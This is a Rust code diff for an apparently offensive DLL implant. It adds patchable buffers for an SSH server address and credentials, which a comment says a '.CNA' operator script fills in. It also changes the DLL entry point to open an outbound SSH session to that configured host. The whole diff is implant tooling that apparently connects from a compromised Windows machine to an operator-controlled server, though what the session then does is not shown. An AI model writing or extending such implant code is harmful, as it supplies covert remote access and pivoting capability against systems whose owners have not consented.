@@ -16,6 +16,17 @@ use windows::*;
 use std::net::TcpStream;
 use ssh2::Session;
 
+// IPv4 ADDRESS IS STOMPED IN BY .CNA
+#[cfg(not(debug_assertions))]
+pub static SSH_IPV4_ADDRESS: &[u8; 20] = b"255.255.255.255\0\0\0\0\0";
+
+#[cfg(debug_assertions)]
+pub static SSH_IPV4_ADDRESS: &[u8; 20] = b"192.168.0.228\0\0\0\0\0\0\0";
+
+pub static USERNAME_STRING: &[u8; 64] = b"USERNAME_STRING_NO_CHANGE_PLS\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
+pub static PASSWORD_STRING: &[u8; 64] = b"PASSWORD_STRING_NO_CHANGE_PLS\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
+const SSH_PORT: u16 = 22;
+
 /// Entry point for the custom Rust-based DLL.
 ///
 /// This function serves as the main entry point for invoking functionality
@@ -38,8 +49,14 @@ pub fn dll_main() {
         Some(h) => h,
     };
 
+    // Convert the IP address bytes to string more efficiently
+    let ip_address = String::from_utf8_lossy(SSH_IPV4_ADDRESS);
+    let server_address = format!("{}:{}", ip_address, SSH_PORT);
+
+    dbg!(&server_address);
+
     // Connect to the local SSH server
-    let tcp = TcpStream::connect("192.168.0.228:22").unwrap();
+    let tcp = TcpStream::connect(server_address).unwrap();
     let mut sess = Session::new().unwrap();
     sess.set_tcp_stream(tcp);
     sess.handshake().unwrap();
